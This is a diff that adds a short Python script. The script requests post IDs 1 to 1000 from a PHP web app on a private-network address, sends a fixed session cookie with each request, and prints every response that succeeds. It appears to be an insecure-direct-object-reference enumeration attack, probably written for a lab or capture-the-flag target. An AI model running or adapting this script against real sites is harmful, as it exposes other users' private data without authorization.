@@ -1,0 +1,39 @@
+import requests
+
+# Define the correct URL pattern with the scheme (http or https)
+url_pattern = "http://192.168.1.215:24001/post.php?action=read&id={}"
+
+# Define the range of IDs to attempt (for example, 1 to 1000)
+start_id = 1
+end_id = 1000
+
+# Define the custom headers
+headers = {
+    "Host": "192.168.1.215:24001",
+    "Accept-Language": "en-US",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
+    "Accept": "*/*",
+    "Referer": "http://192.168.1.215:24001/wall.php",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Cookie": "PHPSESSID=61087590a5cf248004232b691de085aa",
+    "Connection": "keep-alive"
+}
+
+# Loop through each ID
+for id in range(start_id, end_id + 1):
+    # Construct the URL with the current ID
+    url = url_pattern.format(id)
+    
+    try:
+        # Send the GET request with custom headers
+        response = requests.get(url, headers=headers)
+        
+        # Check if the response status code is 200 (OK)
+        if response.status_code == 200:
+            print(f"Found valid ID: {id}")
+            print(f"URL: {url}")
+            print(f"Response: {response.text}")
+        else:
+            print(f"ID {id} returned status code {response.status_code}")
+    except requests.RequestException as e:
+        print(f"An error occurred for ID {id}: {e}")
